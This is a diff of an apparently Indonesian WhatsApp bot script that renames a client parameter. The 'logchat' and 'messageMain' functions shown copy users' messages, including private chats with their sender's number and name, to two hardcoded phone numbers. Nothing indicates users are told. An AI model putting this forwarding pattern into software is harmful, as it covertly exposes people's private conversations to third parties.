@@ -26,14 +26,14 @@ const logfitur = async(nomor, nama, fitur, grup, link) => {
     }
 }
 
-const logchat = async(client, nomor, nama, grup, chat) =>{
+const logchat = async(eula, nomor, nama, grup, chat) =>{
     if(grup == false){grup = "private chat"}
-    client.sendMessage("62895395391278@c.us",nomor+" dengan nama "+nama+" di grup "+grup+" mengirim pesan : \n\n"+chat);
-    client.sendMessage("6289514651477@c.us",nomor+" dengan nama "+nama+" di grup "+grup+" mengirim pesan : \n\n"+chat);
+    eula.sendMessage("62895395391278@c.us",nomor+" dengan nama "+nama+" di grup "+grup+" mengirim pesan : \n\n"+chat);
+    eula.sendMessage("6289514651477@c.us",nomor+" dengan nama "+nama+" di grup "+grup+" mengirim pesan : \n\n"+chat);
 }
 
-const messageMain = async(client, message) => {
-    client.sendMessage("62895395391278@c.us",message);
+const messageMain = async(eula, message) => {
+    eula.sendMessage("62895395391278@c.us",message);
     //Hehe
 }
 
